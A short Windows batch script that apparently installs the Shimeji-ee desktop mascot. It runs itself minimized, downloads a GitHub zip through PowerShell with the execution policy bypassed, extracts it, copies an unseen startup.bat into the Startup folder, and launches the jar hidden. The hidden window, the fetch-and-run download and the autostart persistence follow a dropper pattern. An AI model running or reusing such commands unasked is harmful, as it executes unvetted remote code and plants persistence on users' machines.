@echo off

:: Run this script minimized
if not "%1" == "minimized" (
    start /min cmd /c "%~f0" minimized
    exit
)

:: Navigate to the root of C:
cd /d C:\ || exit /b

:: Create a directory named 's'
mkdir s 2>nul

:: Download the zip file
PowerShell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/obi3333/Oba/archive/refs/heads/main.zip' -OutFile 'C:/s/m.zip'" || exit /b

:: Extract the downloaded zip file
PowerShell -ExecutionPolicy Bypass -Command "Expand-Archive -Path 'C:/s/m.zip' -DestinationPath 'C:/s' -Force" || exit /b

:: Extract the second zip file
PowerShell -ExecutionPolicy Bypass -Command "Expand-Archive -Path 'C:/s/Oba-main/shimeege.zip' -DestinationPath 'C:/s/shimeege' -Force" || exit /b

:: Add the startup script to the Windows startup folder
set "STARTUP_FOLDER=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "C:/s/Oba-main/startup.bat" "%STARTUP_FOLDER%\startup.bat" /y || exit /b

:: Navigate to the directory containing the Java application
cd /d C:/s/shimeege/shimeege || exit /b

:: Run the Java application
start /min javaw -jar Shimeji-ee.jar
